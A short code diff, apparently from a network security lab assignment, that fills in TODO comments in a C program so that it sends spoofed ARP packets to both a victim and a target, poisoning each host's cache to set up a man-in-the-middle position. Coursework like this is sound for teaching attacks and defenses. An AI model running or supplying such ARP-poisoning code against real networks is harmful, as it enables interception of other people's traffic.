@@ -153,17 +153,12 @@ main(int argc, char **argv)
   }
 
   if(childpid == 0) {
-    // TODO:
-    // =====
-    //   Call send_arp_packets to poison the target's cache with for the entry
-    //   for the victom's IP address.
+		send_arp_packets(handle, num_packets, type, source_mac, dst_mac, victim_ip, target_ip);
     exit(EXIT_SUCCESS);
   }
 
-  // TODO:
-  // =====
-  //   Call send_arp_packets to poison the victim's cache with for the entry
-  //   for the target's IP address.
+	// send to hostB
+	send_arp_packets(handle, num_packets, type, source_mac, dst_mac, target_ip, victim_ip);
 
   exit(EXIT_SUCCESS);
 }
